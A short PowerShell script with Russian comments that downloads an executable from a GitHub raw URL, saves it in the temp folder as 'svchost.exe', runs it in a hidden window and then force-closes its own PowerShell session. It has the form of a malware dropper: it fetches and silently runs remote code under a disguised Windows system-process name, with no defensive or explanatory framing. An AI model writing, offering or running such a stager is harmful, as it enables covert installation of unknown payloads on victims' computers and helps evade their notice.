# Скачиваем и запускаем exe
$exeUrl = "https://raw.githubusercontent.com/hk1500/s/22bee0700f758a2aafcf592fd66d1bcd208e7644/1.exe"
$exePath = "$env:TEMP\svchost.exe"

try {
    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing -ErrorAction Stop
    
    # Запускаем
    Start-Process -FilePath $exePath -WindowStyle Hidden
    
    # Ждём 2 секунды и закрываем powershell
    Start-Sleep -Seconds 2
} catch {
    # Если ошибка — тоже закрываемся
    Start-Sleep -Seconds 1
}

# Принудительно закрываем окно
Stop-Process -Id $PID -Force
